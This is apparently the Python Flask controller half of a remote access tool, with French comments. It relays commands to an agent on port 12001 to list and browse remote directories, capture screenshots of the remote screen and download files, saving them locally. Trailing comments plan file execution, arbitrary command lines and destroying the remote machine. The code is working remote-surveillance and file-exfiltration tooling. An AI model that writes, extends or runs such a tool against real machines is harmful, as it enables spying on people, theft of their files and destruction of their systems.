from flask import Flask
from flask import request
import requests
from flask_cors import CORS
import datetime
import json
import os


app = Flask(__name__)
CORS(app)

# obtenir le repertoire courant
@app.route("/get_current_dir", methods=["POST", "GET"])
def navigate():
    # try:
    result = requests.get("http://localhost:12001/get_current_dir")
    print(result.content.decode())
    return result.content


# aller dans un dossier
@app.route("/go_dir", methods=["POST", "GET"])
def go_dir():
    r = request.get_data()
    if r.decode("utf-8")[-1] == "@":
        return f"{r.decode('utf-8')} n'est pas un dossier, imposible de naviguer dedans."
    r = requests.get("http://localhost:12001/go_dir", data=r)
    return r.content


# aller en arrière
@app.route("/go_back", methods=["POST", "GET"])
def go_back():
    # try:
    result = requests.get("http://localhost:12001/go_back")
    print(result.content.decode())
    return result.content
    

# screenshot
@app.route("/screenshot", methods=["POST", "GET"])
def screeshot():
    filename = "Capture_" + datetime.datetime.strftime(datetime.datetime.now(), "%d-%m-%Y_%Hh%Mm%Ss") + ".png"
    # try:
    image = requests.get("http://localhost:12001/screenshot")
    # Chemin du dossier contenant le script actuel
    print(image.content)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    dir = base_dir + "\\fichiers reçus\\"
    f = open(dir + filename, "wb")
    f.write(image.content)
    f.close()
    return f"{filename} enregistré avec succès! DESTINATION: {dir}"
    # except:
    #     return "Erreur lors de la capture d'écran"


# download
@app.route("/download", methods=["POST", "GET"])
def download():
    r = request.get_data()
    print(r)
    filename = json.loads(r)
    if filename[-1] != "@":
        return f"'{filename}' n'est pas un fichier, veillez télécharger un fichier à la fois."
    result = requests.get("http://localhost:12001/download", data=r)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    dir = base_dir + "\\fichiers reçus\\" + json.loads(r).split("\\")[-1][:-1]
    f = open(dir, "wb")
    f.write(result.content)
    f.close()
    return result.content


if __name__ == "__main__":
    app.run(host="localhost", port=12000) 




# télécharger un fichier

# Executer un fichier

# Aller dans un répertoire et revenir en arrière

# prendre une capture d'écran - ok

# détruire la machine distante

# envoyer une ligne de commande custom

# screenshot